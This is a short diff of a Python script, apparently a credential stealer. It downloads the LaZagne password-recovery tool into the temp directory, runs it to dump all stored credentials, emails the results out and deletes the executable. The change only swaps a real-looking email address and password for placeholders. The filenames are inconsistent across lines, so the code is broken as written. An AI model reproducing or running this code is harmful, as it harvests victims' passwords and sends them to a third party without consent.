@@ -18,5 +18,5 @@ temp_dir = tempfile.gettempdir()
 os.chdir(temp_dir)
 download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")#lazane link
 result = subprocess.check_output("lazane.exe all",shell=True)
-send_mail("neupaneyamuna@gmail.com","sulavsugamad",result)
+send_mail("youremail@gmail.com","password",result)
 os.remove("laZane.exe")
